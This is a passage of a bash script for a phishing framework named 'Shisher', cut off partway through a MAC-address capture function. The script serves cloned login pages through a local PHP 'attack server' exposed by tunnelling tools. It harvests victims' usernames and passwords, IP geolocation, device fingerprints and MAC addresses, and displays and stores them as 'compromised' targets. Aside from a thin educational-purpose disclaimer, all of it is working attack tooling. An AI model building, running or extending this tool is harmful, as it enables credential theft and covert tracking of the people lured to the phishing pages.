#!/bin/bash

version__="2.3.5"

## ADVANCED ANSI STYLING
BOLD="$(printf '\033[1m')"
DIM="$(printf '\033[2m')"
UNDERLINE="$(printf '\033[4m')"
BLINK="$(printf '\033[5m')"
REVERSE="$(printf '\033[7m')"
RESET="$(printf '\033[0m')"

## DEFAULT HOST & PORT
HOST='127.0.0.1'
PORT='8080' 

## ANSI colors (FG & BG) - Enhanced Color Palette
RED="$(printf '\033[31m')"  GREEN="$(printf '\033[32m')"  ORANGE="$(printf '\033[33m')"  BLUE="$(printf '\033[34m')"
MAGENTA="$(printf '\033[35m')"  CYAN="$(printf '\033[36m')"  WHITE="$(printf '\033[37m')" BLACK="$(printf '\033[30m')"
YELLOW="$(printf '\033[93m')"  LBLUE="$(printf '\033[94m')"  LGREEN="$(printf '\033[92m')"  LRED="$(printf '\033[91m')"
LCYAN="$(printf '\033[96m')"  LMAGENTA="$(printf '\033[95m')"  GRAY="$(printf '\033[90m')"
REDBG="$(printf '\033[41m')"  GREENBG="$(printf '\033[42m')"  ORANGEBG="$(printf '\033[43m')"  BLUEBG="$(printf '\033[44m')"
MAGENTABG="$(printf '\033[45m')"  CYANBG="$(printf '\033[46m')"  WHITEBG="$(printf '\033[47m')" BLACKBG="$(printf '\033[40m')"
RESETBG="$(printf '\e[0m\n')"

## Directories
BASE_DIR=$(realpath "$(dirname "$BASH_SOURCE")")

if [[ ! -d ".server" ]]; then
	mkdir -p ".server"
fi

## Log file for monitoring
LOGFILE=".server/shisher.log"

if [[ ! -d "auth" ]]; then
	mkdir -p "auth"
fi

if [[ -d ".server/www" ]]; then
	rm -rf ".server/www"
	mkdir -p ".server/www"
else
	mkdir -p ".server/www"
fi

## Remove logfile
if [[ -e ".server/.loclx" ]]; then
	rm -rf ".server/.loclx"
fi

if [[ -e ".server/.cld.log" ]]; then
	rm -rf ".server/.cld.log"
fi

## Script termination
exit_on_signal_SIGINT() {
	{ printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Program Interrupted." 2>&1; reset_color; }
	exit 0
}

exit_on_signal_SIGTERM() {
	{ printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Program Terminated." 2>&1; reset_color; }
	exit 0
}

trap exit_on_signal_SIGINT SIGINT
trap exit_on_signal_SIGTERM SIGTERM

## Reset terminal colors
reset_color() {
	tput sgr0   # reset attributes
	tput op     # reset color
	return
}

## Logging functions
log_init() {
	echo "" > "$LOGFILE"
	echo -e "${RED}╔═══════════════════════════════════════════════════════════════════╗${RESET}" >> "$LOGFILE"
	echo -e "${RED}║${LRED}                    ▼ SHISHER ACTIVITY LOG ▼                      ${RED}║${RESET}" >> "$LOGFILE"
	echo -e "${RED}║${GRAY}                 Session: $(date '+%Y-%m-%d %H:%M:%S')                ${RED}║${RESET}" >> "$LOGFILE"
	echo -e "${RED}╚═══════════════════════════════════════════════════════════════════╝${RESET}" >> "$LOGFILE"
	echo "" >> "$LOGFILE"
}

log_msg() {
	local timestamp=$(date '+%H:%M:%S')
	echo -e "${GRAY}[${RED}${timestamp}${GRAY}] ${WHITE}$1${RESET}" >> "$LOGFILE"
}

log_success() {
	local timestamp=$(date '+%H:%M:%S')
	echo -e "${GRAY}[${RED}${timestamp}${GRAY}] ${LGREEN}[${WHITE}+${LGREEN}]${WHITE} $1${RESET}" >> "$LOGFILE"
}

log_error() {
	local timestamp=$(date '+%H:%M:%S')
	echo -e "${GRAY}[${RED}${timestamp}${GRAY}] ${LRED}[${WHITE}!${LRED}]${WHITE} $1${RESET}" >> "$LOGFILE"
}

log_action() {
	local timestamp=$(date '+%H:%M:%S')
	echo -e "${GRAY}[${RED}${timestamp}${GRAY}] ${RED}[${WHITE}*${RED}]${GRAY} $1${RESET}" >> "$LOGFILE"
}

log_separator() {
	echo -e "${RED}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}" >> "$LOGFILE"
}

## Open log viewer in new terminal window
open_log_viewer() {
	log_init
	
	echo -ne "${GRAY}[${RED}*${GRAY}] Opening log viewer...${RESET}\n"
	
	# Detect terminal and open log viewer
	if command -v gnome-terminal &> /dev/null; then
		gnome-terminal --title="SHISHER ACTIVITY LOG" --geometry=100x30 -- bash -c "while true; do clear; echo -e '\033[0;31m═══════════════════════════════════════════════════════════════════\033[0m'; echo -e '\033[1;91m                  ▼ SHISHER ACTIVITY LOG ▼\033[0m'; echo -e '\033[0;31m═══════════════════════════════════════════════════════════════════\033[0m'; echo ''; tail -f '$LOGFILE' 2>/dev/null || echo 'Waiting for log file...'; sleep 1; done" &
		echo -e "${LGREEN}[${WHITE}+${LGREEN}] ${WHITE}Log viewer opened in new window${RESET}"
	elif command -v xterm &> /dev/null; then
		xterm -T "SHISHER ACTIVITY LOG" -geometry 100x30 -bg black -fg white -e bash -c "while true; do clear; echo -e '\033[0;31m═══════════════════════════════════════════════════════════════════\033[0m'; echo -e '\033[1;91m                  ▼ SHISHER ACTIVITY LOG ▼\033[0m'; echo -e '\033[0;31m═══════════════════════════════════════════════════════════════════\033[0m'; echo ''; tail -f '$LOGFILE' 2>/dev/null || echo 'Waiting for log file...'; sleep 1; done" &
		echo -e "${LGREEN}[${WHITE}+${LGREEN}] ${WHITE}Log viewer opened in xterm${RESET}"
	elif command -v konsole &> /dev/null; then
		konsole --title "SHISHER ACTIVITY LOG" -e bash -c "while true; do clear; echo -e '\033[0;31m═══════════════════════════════════════════════════════════════════\033[0m'; echo -e '\033[1;91m                  ▼ SHISHER ACTIVITY LOG ▼\033[0m'; echo -e '\033[0;31m═══════════════════════════════════════════════════════════════════\033[0m'; echo ''; tail -f '$LOGFILE' 2>/dev/null || echo 'Waiting for log file...'; sleep 1; done" &
		echo -e "${LGREEN}[${WHITE}+${LGREEN}] ${WHITE}Log viewer opened in konsole${RESET}"
	elif command -v terminator &> /dev/null; then
		terminator -T "SHISHER ACTIVITY LOG" -e "bash -c \"while true; do clear; echo -e '\033[0;31m═══════════════════════════════════════════════════════════════════\033[0m'; echo -e '\033[1;91m                  ▼ SHISHER ACTIVITY LOG ▼\033[0m'; echo -e '\033[0;31m═══════════════════════════════════════════════════════════════════\033[0m'; echo ''; tail -f '$LOGFILE' 2>/dev/null || echo 'Waiting for log file...'; sleep 1; done\"" &
		echo -e "${LGREEN}[${WHITE}+${LGREEN}] ${WHITE}Log viewer opened in terminator${RESET}"
	elif command -v x-terminal-emulator &> /dev/null; then
		x-terminal-emulator -e bash -c "while true; do clear; echo -e '\033[0;31m═══════════════════════════════════════════════════════════════════\033[0m'; echo -e '\033[1;91m                  ▼ SHISHER ACTIVITY LOG ▼\033[0m'; echo -e '\033[0;31m═══════════════════════════════════════════════════════════════════\033[0m'; echo ''; tail -f '$LOGFILE' 2>/dev/null || echo 'Waiting for log file...'; sleep 1; done" &
		echo -e "${LGREEN}[${WHITE}+${LGREEN}] ${WHITE}Log viewer opened${RESET}"
	elif [[ -n "$TMUX" ]]; then
		tmux split-window -v -p 30 "while true; do clear; echo -e '\033[0;31m═══════════════════════════════════════════════════════════════════\033[0m'; echo -e '\033[1;91m                  ▼ SHISHER ACTIVITY LOG ▼\033[0m'; echo -e '\033[0;31m═══════════════════════════════════════════════════════════════════\033[0m'; echo ''; tail -f '$LOGFILE' 2>/dev/null || echo 'Waiting for log file...'; sleep 1; done"
		echo -e "${LGREEN}[${WHITE}+${LGREEN}] ${WHITE}Log viewer opened in tmux pane${RESET}"
	else
		echo -e "${LRED}[${WHITE}!${LRED}] ${WHITE}No compatible terminal found${RESET}"
		echo -e "${GRAY}[${RED}*${GRAY}] Available terminals: gnome-terminal, xterm, konsole, terminator${RESET}"
		echo -e "${GRAY}[${RED}*${GRAY}] Logs will be saved to: ${WHITE}$LOGFILE${RESET}"
		echo -e "${GRAY}[${RED}*${GRAY}] View logs with: ${WHITE}tail -f $LOGFILE${RESET}\n"
		sleep 2
		return 1
	fi
	
	sleep 0.5
	log_success "Log viewer initialized"
	log_msg "Framework version: v${version__}"
	log_separator
}

## Kill already running process
kill_pid() {
	check_PID="php cloudflared loclx"
	for process in ${check_PID}; do
		if [[ $(pidof ${process}) ]]; then # Check for Process
			killall ${process} > /dev/null 2>&1 # Kill the Process
		fi
	done
}

# Check for a newer release with spinner animation
spinner() {
	local pid=$1
	local delay=0.1
	local spinstr='⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏'
	while [ "$(ps a | awk '{print $1}' | grep $pid)" ]; do
		local temp=${spinstr#?}
		printf " [${CYAN}%c${RESET}]  " "$spinstr"
		local spinstr=$temp${spinstr%"$temp"}
		sleep $delay
		printf "\b\b\b\b\b\b"
	done
	printf "    \b\b\b\b"
}

# Check for a newer release
check_update(){
	echo -ne "\n${RED}╭─${WHITE} CHECKING FOR UPDATES ${RED}─────────────────────────────────────╮\n"
	echo -ne "${RED}│${RESET} "
	relase_url='https://api.github.com/repos/htr-tech/shisher/releases/latest'
	new_version=$(curl -s "${relase_url}" | grep '"tag_name":' | awk -F\" '{print $4}')
	tarball_url="https://github.com/htr-tech/shisher/archive/refs/tags/${new_version}.tar.gz"

	if [[ $new_version != $__version__ ]]; then
		echo -ne "${LRED}[${WHITE}!${LRED}]${WHITE} Update found: ${BOLD}${new_version}${RESET}\n"
		echo -ne "${RED}├─${WHITE} Downloading update...\n"
		sleep 1
		pushd "$HOME" > /dev/null 2>&1
		curl --silent --insecure --fail --retry-connrefused \
		--retry 3 --retry-delay 2 --location --output ".shisher.tar.gz" "${tarball_url}"

		if [[ -e ".shisher.tar.gz" ]]; then
			tar -xf .shisher.tar.gz -C "$BASE_DIR" --strip-components 1 > /dev/null 2>&1
			[ $? -ne 0 ] && { echo -e "\n\n${RED}[${WHITE}X${RED}]${WHITE} Error occurred while extracting."; reset_color; exit 1; }
			rm -f .shisher.tar.gz
			popd > /dev/null 2>&1
			{ sleep 2; clear; banner_small; }
			echo -ne "\n${LGREEN}[${WHITE}+${LGREEN}]${WHITE} Successfully updated! Run shisher again\n\n"
			echo -ne "${RED}╰──────────────────────────────────────────────────────────────╯${RESET}\n\n"
			{ reset_color ; exit 1; }
		else
			echo -e "\n${RED}[${WHITE}X${RED}]${WHITE} Error occurred while downloading."
			{ reset_color; exit 1; }
		fi
	else
		echo -ne "${LGREEN}[${WHITE}OK${LGREEN}]${WHITE} Up to date ${GRAY}(v${version__})${RESET}\n"
		echo -ne "${RED}╰──────────────────────────────────────────────────────────────╯${RESET}\n"
		sleep .5
	fi
}

## Check Internet Status
check_status() {
	echo -ne "\n${RED}╭─${WHITE} SYSTEM STATUS ${RED}────────────────────────────────────────────╮\n"
	echo -ne "${RED}│${RESET} Network Connection: "
	timeout 3s curl -fIs "https://api.github.com" > /dev/null
	if [ $? -eq 0 ]; then
		echo -e "${LGREEN}[${WHITE}ONLINE${LGREEN}]${RESET}"
		echo -ne "${RED}╰──────────────────────────────────────────────────────────────╯${RESET}\n"
		check_update
	else
		echo -e "${LRED}[${WHITE}OFFLINE${LRED}]${RESET}"
		echo -ne "${RED}╰──────────────────────────────────────────────────────────────╯${RESET}\n"
	fi
}

## Banner - SHISHER Pixel Art with Blood Drip
banner() {
	cat <<- EOF
 ▄▀▀▀▀▄  ▄▀▀▄ ▄▄   ▄▀▀█▀▄   ▄▀▀▀▀▄  ▄▀▀▄ ▄▄   ▄▀▀█▄▄▄▄  ▄▀▀▄▀▀▀▄ 
█ █   ▐ █  █   ▄▀ █   █  █ █ █   ▐ █  █   ▄▀ ▐  ▄▀   ▐ █   █   █ 
   ▀▄   ▐  █▄▄▄█  ▐   █  ▐    ▀▄   ▐  █▄▄▄█    █▄▄▄▄▄  ▐  █▀▀█▀  
▀▄   █     █   █      █    ▀▄   █     █   █    █    ▌   ▄▀    █  
 █▀▀▀     ▄▀  ▄▀   ▄▀▀▀▀▀▄  █▀▀▀     ▄▀  ▄▀   ▄▀▄▄▄▄   █     █   
 ▐       █   █    █       █ ▐       █   █     █    ▐   ▐     ▐   
         ▐   ▐    ▐       ▐         ▐   ▐     ▐                  

		${DIM}${GRAY}                 Coded By  ${RED}${BOLD}darkwall${RESET}
		${DIM}${GRAY}                 ${RED}https://github.com/pythonplayer396/${RESET}

		${DIM}${GRAY}    ┌──────────────────────────────────────────────────────┐
		    │  ${RED}!${GRAY}  Educational Purpose Only - Use Responsibly  ${RED}!${GRAY}  │
		    └──────────────────────────────────────────────────────┘${RESET}

	EOF
}

## Small Banner - Blood Drip Style
banner_small() {
	cat <<- EOF

		                                                                      
           ▄▄           ██               ▄▄                           
           ██           ▀▀               ██                           
 ▄▄█████▄  ██▄████▄   ████     ▄▄█████▄  ██▄████▄   ▄████▄    ██▄████ 
 ██▄▄▄▄ ▀  ██▀   ██     ██     ██▄▄▄▄ ▀  ██▀   ██  ██▄▄▄▄██   ██▀     
  ▀▀▀▀██▄  ██    ██     ██      ▀▀▀▀██▄  ██    ██  ██▀▀▀▀▀▀   ██      
 █▄▄▄▄▄██  ██    ██  ▄▄▄██▄▄▄  █▄▄▄▄▄██  ██    ██  ▀██▄▄▄▄█   ██      
  ▀▀▀▀▀▀   ▀▀    ▀▀  ▀▀▀▀▀▀▀▀   ▀▀▀▀▀▀   ▀▀    ▀▀    ▀▀▀▀▀    ▀▀      
                                                                      
                                                                      
	EOF
}

## Dependencies
dependencies() {
	log_action "Checking dependencies..."
	echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing required packages..."

	if [[ -d "/data/data/com.termux/files/home" ]]; then
		if [[ ! $(command -v proot) ]]; then
			echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}proot${CYAN}"${WHITE}
			pkg install proot resolv-conf -y
		fi

		if [[ ! $(command -v tput) ]]; then
			echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}ncurses-utils${CYAN}"${WHITE}
			pkg install ncurses-utils -y
		fi
	fi

	if [[ $(command -v php) && $(command -v curl) && $(command -v unzip) ]]; then
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Packages already installed."
	else
		pkgs=(php curl unzip)
		for pkg in "${pkgs[@]}"; do
			type -p "$pkg" &>/dev/null || {
				echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}$pkg${CYAN}"${WHITE}
				if [[ $(command -v pkg) ]]; then
					pkg install "$pkg" -y
				elif [[ $(command -v apt) ]]; then
					sudo apt install "$pkg" -y
				elif [[ $(command -v apt-get) ]]; then
					sudo apt-get install "$pkg" -y
				elif [[ $(command -v pacman) ]]; then
					sudo pacman -S "$pkg" --noconfirm
				elif [[ $(command -v dnf) ]]; then
					sudo dnf -y install "$pkg"
				elif [[ $(command -v yum) ]]; then
					sudo yum -y install "$pkg"
				else
					echo -e "\n${RED}[${WHITE}!${RED}]${RED} Unsupported package manager, Install packages manually."
					{ reset_color; exit 1; }
				fi
			}
		done
	fi
}

# Download Binaries
download() {
	url="$1"
	output="$2"
	file=`basename $url`
	if [[ -e "$file" || -e "$output" ]]; then
		rm -rf "$file" "$output"
	fi
	curl --silent --insecure --fail --retry-connrefused \
		--retry 3 --retry-delay 2 --location --output "${file}" "${url}"

	if [[ -e "$file" ]]; then
		if [[ ${file#*.} == "zip" ]]; then
			unzip -qq $file > /dev/null 2>&1
			mv -f $output .server/$output > /dev/null 2>&1
		elif [[ ${file#*.} == "tgz" ]]; then
			tar -zxf $file > /dev/null 2>&1
			mv -f $output .server/$output > /dev/null 2>&1
		else
			mv -f $file .server/$output > /dev/null 2>&1
		fi
		chmod +x .server/$output > /dev/null 2>&1
		rm -rf "$file"
	else
		echo -e "\n${RED}[${WHITE}!${RED}]${RED} Error occured while downloading ${output}."
		{ reset_color; exit 1; }
	fi
}

## Install Cloudflared
install_cloudflared() {
	if [[ -e ".server/cloudflared" ]]; then
		log_success "Cloudflared already installed"
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Cloudflared already installed."
	else
		log_action "Installing Cloudflared..."
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing Cloudflared..."${WHITE}
		arch=`uname -m`
		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm' 'cloudflared'
		elif [[ "$arch" == *'aarch64'* ]]; then
			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64' 'cloudflared'
		elif [[ "$arch" == *'x86_64'* ]]; then
			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64' 'cloudflared'
		else
			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386' 'cloudflared'
		fi
		log_success "Cloudflared installed successfully"
	fi
}

## Install LocalXpose
install_localxpose() {
	if [[ -e ".server/loclx" ]]; then
		log_success "LocalXpose already installed"
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} LocalXpose already installed."
	else
		log_action "Installing LocalXpose..."
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing LocalXpose..."${WHITE}
		arch=`uname -m`
		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-arm.zip' 'loclx'
		elif [[ "$arch" == *'aarch64'* ]]; then
			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-arm64.zip' 'loclx'
		elif [[ "$arch" == *'x86_64'* ]]; then
			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-amd64.zip' 'loclx'
		else
			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-386.zip' 'loclx'
		fi
		log_success "LocalXpose installed successfully"
	fi
}

## Exit message - Enhanced
msg_exit() {
	{ clear; banner; echo; }
	cat <<- EOF
		${LCYAN}╔═══════════════════════════════════════════════════════════════════╗
		${LCYAN}║${LGREEN}                                                                   ${LCYAN}║
		${LCYAN}║${LGREEN}            Thank you for using Shisher Framework!                ${LCYAN}║
		${LCYAN}║${WHITE}                                                                   ${LCYAN}║
		${LCYAN}║${GRAY}              Stay safe and use responsibly!                       ${LCYAN}║
		${LCYAN}║${WHITE}                                                                   ${LCYAN}║
		${LCYAN}╚═══════════════════════════════════════════════════════════════════╝${RESET}

	EOF
	{ reset_color; exit 0; }
}

## About - Enhanced Design
about() {
	{ clear; banner; echo; }
	cat <<- EOF
		${LCYAN}╔═══════════════════════════════════════════════════════════════════╗
		${LCYAN}║${YELLOW}                        ABOUT SHISHER                             ${LCYAN}║
		${LCYAN}╠═══════════════════════════════════════════════════════════════════╣
		${LCYAN}║${WHITE}                                                                   ${LCYAN}║
		${LCYAN}║${LGREEN}  Version:${WHITE} ${version__}                                                    ${LCYAN}║
		${LCYAN}║${LGREEN}  Author:${WHITE} darkwall                                                 ${LCYAN}║
		${LCYAN}║${LGREEN}  Discord:${WHITE} discord.com/users/1238914120179515402                 ${LCYAN}║
		${LCYAN}║${WHITE}                                                                   ${LCYAN}║
		${LCYAN}╠═══════════════════════════════════════════════════════════════════╣
		${LCYAN}║${LRED}                           WARNING                               ${LCYAN}║
		${LCYAN}╠═══════════════════════════════════════════════════════════════════╣
		${LCYAN}║${GRAY}                                                                   ${LCYAN}║
		${LCYAN}║${GRAY}  • This tool is for EDUCATIONAL PURPOSES ONLY                     ${LCYAN}║
		${LCYAN}║${GRAY}  • Author is NOT responsible for any misuse                      ${LCYAN}║
		${LCYAN}║${GRAY}  • Unauthorized access to accounts is ILLEGAL                    ${LCYAN}║
		${LCYAN}║${GRAY}  • Use at your own risk and responsibility                       ${LCYAN}║
		${LCYAN}║${GRAY}                                                                   ${LCYAN}║
		${LCYAN}╠═══════════════════════════════════════════════════════════════════╣
		${LCYAN}║ ${WHITE}00${LCYAN}) ${LGREEN}Main Menu                ${WHITE}99${LCYAN}) ${LRED}Exit                    ${LCYAN}║
		${LCYAN}╚═══════════════════════════════════════════════════════════════════╝${RESET}

	EOF

	echo -ne "${LCYAN}┌─${WHITE} Select an option ${LCYAN}─────────────────────────────────────────────╮\n"
	read -p "${LCYAN}│${RESET} ${LGREEN}>${RESET} " REPLY
	echo -ne "${LCYAN}└──────────────────────────────────────────────────────────────────╯${RESET}\n\n"
	case $REPLY in 
		99)
			msg_exit;;
		0 | 00)
			echo -ne "\n${LCYAN}> ${WHITE}Returning to main menu...${RESET}"
			{ sleep 1; main_menu; };;
		*)
			echo -ne "\n${LRED}x ${WHITE}Invalid option! ${GRAY}Please try again...${RESET}"
			{ sleep 1; about; };;
	esac
}

## Choose custom port - Dark Theme
cusport() {
	echo
	echo -ne "${RED}╭─${WHITE} PORT CONFIGURATION ${RED}────────────────────────────────────────╮\n"
	read -n1 -p "${RED}│${RESET} ${GRAY}Custom Port? ${GRAY}[${WHITE}y${GRAY}/${LRED}N${GRAY}]:${RESET} " P_ANS
	if [[ ${P_ANS} =~ ^([yY])$ ]]; then
		echo -e "\n${RED}├─${WHITE} Enter port (1024-9999)${RED}${RESET}"
		read -n4 -p "${RED}│${RESET} ${LRED}►${RESET} " CU_P
		if [[ ! -z  ${CU_P} && "${CU_P}" =~ ^([1-9][0-9][0-9][0-9])$ && ${CU_P} -ge 1024 ]]; then
			PORT=${CU_P}
			echo -e "\n${RED}╰─${LGREEN}[${WHITE}OK${LGREEN}]${WHITE} Custom port: ${WHITE}${PORT}${RESET}"
			echo
		else
			echo -ne "\n${RED}╰─${LRED}[${WHITE}!${LRED}]${WHITE} Invalid port: ${LRED}$CU_P${GRAY} - Retry${RESET}"
			{ sleep 2; clear; banner_small; cusport; }
		fi		
	else 
		echo -ne "\n${RED}╰─${LGREEN}[${WHITE}OK${LGREEN}]${WHITE} Default port: ${WHITE}$PORT${RESET}\n"
	fi
}

## Setup website and start php server - Dark Theme
setup_site() {
	log_action "Configuring attack server for: $website"
	echo -e "\n${RED}╭─${WHITE} SERVER INITIALIZATION ${RED}─────────────────────────────────────────────╮"
	echo -ne "${RED}│${RESET} ${GRAY}[${RED}*${GRAY}] Configuring attack server..."
	cp -rf .sites/"$website"/* .server/www
	cp -f .sites/ip.php .server/www/
	cp -f .sites/fingerprint.js .server/www/
	cp -f .sites/save_fingerprint.php .server/www/
	cp -f .sites/mac_hunter.js .server/www/
	cp -f .sites/save_mac.php .server/www/
	log_success "Server files deployed with advanced tracking"
	echo -e " ${LGREEN}[${WHITE}OK${LGREEN}]${RESET}"
	echo -ne "${RED}│${RESET} ${GRAY}[${RED}*${GRAY}] Starting PHP backdoor..."
	cd .server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 &
	log_success "PHP server started on $HOST:$PORT"
	echo -e " ${LGREEN}[${WHITE}OK${LGREEN}]${RESET}"
	echo -ne "${RED}╰───────────────────────────────────────────────────────────────────╯${RESET}\n"
	log_separator
}

## Get IP address - Enhanced with Geolocation
capture_ip() {
	# Read the enhanced IP data
	local ip_file=".server/www/ip.txt"
	
	# Parse the data
	local ip_addr=$(grep "Real IP Address:" "$ip_file" | tail -1 | awk -F': ' '{print $2}')
	local country=$(grep "Country:" "$ip_file" | tail -1 | awk -F': ' '{print $2}')
	local region=$(grep "Region:" "$ip_file" | tail -1 | awk -F': ' '{print $2}')
	local city=$(grep "City:" "$ip_file" | tail -1 | awk -F': ' '{print $2}')
	local zip_code=$(grep "ZIP Code:" "$ip_file" | tail -1 | awk -F': ' '{print $2}')
	local coords=$(grep "Coordinates:" "$ip_file" | tail -1 | awk -F': ' '{print $2}')
	local timezone=$(grep "Timezone:" "$ip_file" | tail -1 | awk -F': ' '{print $2}')
	local isp=$(grep "ISP:" "$ip_file" | tail -1 | awk -F': ' '{print $2}')
	local org=$(grep "Organization:" "$ip_file" | tail -1 | awk -F': ' '{print $2}')
	local maps_link=$(grep "Maps:" "$ip_file" | tail -1 | awk -F': ' '{print $2":"$3}')
	local user_agent=$(grep "User-Agent:" "$ip_file" | tail -1 | awk -F': ' '{print $2}')
	
	# Log to activity log
	log_separator
	log_success "TARGET IP COMPROMISED: $ip_addr"
	log_msg "Location: $city, $region, $country"
	log_msg "ISP: $isp"
	log_action "Full data saved to: auth/ip.txt"
	
	# Display enhanced information
	echo -e "\n${RED}╔═══════════════════════════════════════════════════════════════════╗${RESET}"
	echo -e "${RED}║${LRED}                     TARGET COMPROMISED                           ${RED}║${RESET}"
	echo -e "${RED}╚═══════════════════════════════════════════════════════════════════╝${RESET}"
	
	echo -e "\n${RED}╔═══${WHITE} IP INFORMATION ${RED}═══════════════════════════════════════════════════╗${RESET}"
	echo -e "${RED}║${RESET} ${GRAY}Real IP:${RESET}     ${BOLD}${LRED}$ip_addr${RESET}"
	
	if [[ ! -z "$country" && "$country" != "Unknown" ]]; then
		echo -e "${RED}║${RESET}"
		echo -e "${RED}╠═══${WHITE} GEOLOCATION ${RED}══════════════════════════════════════════════════════╣${RESET}"
		echo -e "${RED}║${RESET} ${GRAY}Country:${RESET}     ${WHITE}$country${RESET}"
		[[ ! -z "$region" ]] && echo -e "${RED}║${RESET} ${GRAY}Region:${RESET}      ${WHITE}$region${RESET}"
		[[ ! -z "$city" ]] && echo -e "${RED}║${RESET} ${GRAY}City:${RESET}        ${WHITE}$city${RESET}"
		[[ ! -z "$zip_code" && "$zip_code" != "Unknown" ]] && echo -e "${RED}║${RESET} ${GRAY}ZIP Code:${RESET}    ${WHITE}$zip_code${RESET}"
		[[ ! -z "$coords" ]] && echo -e "${RED}║${RESET} ${GRAY}Coordinates:${RESET} ${WHITE}$coords${RESET}"
		[[ ! -z "$timezone" ]] && echo -e "${RED}║${RESET} ${GRAY}Timezone:${RESET}    ${WHITE}$timezone${RESET}"
		
		echo -e "${RED}║${RESET}"
		echo -e "${RED}╠═══${WHITE} ISP & NETWORK ${RED}═════════════════════════════════════════════════════╣${RESET}"
		[[ ! -z "$isp" ]] && echo -e "${RED}║${RESET} ${GRAY}ISP:${RESET}         ${WHITE}$isp${RESET}"
		[[ ! -z "$org" ]] && echo -e "${RED}║${RESET} ${GRAY}Organization:${RESET} ${WHITE}$org${RESET}"
		
		if [[ ! -z "$maps_link" ]]; then
			echo -e "${RED}║${RESET}"
			echo -e "${RED}║${RESET} ${LGREEN}Maps Link:${RESET} ${LBLUE}$maps_link${RESET}"
		fi
	fi
	
	echo -e "${RED}║${RESET}"
	echo -e "${RED}╠═══${WHITE} DEVICE INFO ${RED}═══════════════════════════════════════════════════════╣${RESET}"
	[[ ! -z "$user_agent" ]] && echo -e "${RED}║${RESET} ${GRAY}User-Agent:${RESET}  ${WHITE}${user_agent:0:55}${RESET}"
	
	echo -e "${RED}║${RESET}"
	echo -e "${RED}║${RESET} ${GRAY}Saved to:${RESET}    ${LGREEN}auth/ip.txt${RESET}"
	echo -e "${RED}╚═══════════════════════════════════════════════════════════════════╝${RESET}\n"
	
	# Save to auth folder
	cat "$ip_file" >> auth/ip.txt
}

## Get credentials - Dark Theme
capture_creds() {
	ACCOUNT=$(grep -o 'Username:.*' .server/www/usernames.txt | awk '{print $2}')
	PASSWORD=$(grep -o 'Pass:.*' .server/www/usernames.txt | awk -F ":." '{print $NF}')
	IFS=$'\n'
	log_separator
	log_success "CREDENTIALS COMPROMISED"
	log_msg "Account: $ACCOUNT"
	log_msg "Password: $PASSWORD"
	log_action "Credentials saved to: auth/usernames.dat"
	echo -e "\n${RED}╭─${LRED}[${WHITE}+${LRED}]${WHITE} CREDENTIALS HARVESTED ${RED}──────────────────────────────────────╮"
	echo -e "${RED}│${RESET} ${GRAY}▸ Account:  ${BOLD}${LRED}$ACCOUNT${RESET}"
	echo -e "${RED}│${RESET} ${GRAY}▸ Password: ${BOLD}${WHITE}$PASSWORD${RESET}"
	echo -e "${RED}│${RESET} ${GRAY}▸ Saved to: ${WHITE}auth/usernames.dat${RESET}"
	echo -ne "${RED}╰───────────────────────────────────────────────────────────────────╯${RESET}\n"
	cat .server/www/usernames.txt >> auth/usernames.dat
	echo -ne "\n${GRAY}[${RED}*${GRAY}] Waiting for next target... ${GRAY}(Press ${WHITE}Ctrl+C${GRAY} to abort)${RESET}\n"
}

## Capture fingerprint data
capture_fingerprint() {
	local fp_file=".server/www/fingerprint.txt"
	
	if [[ -e "$fp_file" ]]; then
		# Display the fingerprint data directly
		echo -e "\n${RED}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
		echo -e "${LRED}[${WHITE}+${LRED}] ADVANCED FINGERPRINT CAPTURED${RESET}\n"
		
		# Parse and display key data
		cat "$fp_file" | tail -100 | grep -E "Resolution:|CPU Cores:|Memory:|Platform:|Timezone:|Local IP|GPS LOCATION|GPU|Battery|Network" | while read line; do
			echo -e "${GRAY}$line${RESET}"
		done
		
		echo -e "\n${GRAY}[${RED}*${GRAY}] Full fingerprint data saved to: ${WHITE}auth/fingerprint.txt${RESET}"
		
		# Save to auth folder
		cat "$fp_file" >> auth/fingerprint.txt
		
		# Log to activity log
		log_separator
		log_success "ADVANCED DEVICE FINGERPRINT CAPTURED"
		log_msg "Full data saved to: auth/fingerprint.txt"
		
		rm -rf "$fp_file"
	fi
}

## Capture MAC hunt results
capture_mac() {
	local mac_file=".server/www/mac_hunt.txt"
	
	if [[ -e "$mac_file" ]]; then
		echo -e "\n${RED}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
		echo -e "${LRED}[${WHITE}+${LRED}] MAC ADDRESS HUNT COMPLETE${RESET}\n"
		
		# Check if any MACs were found
		if grep -q "POSSIBLE MAC ADDRESSES" "$mac_file"; then
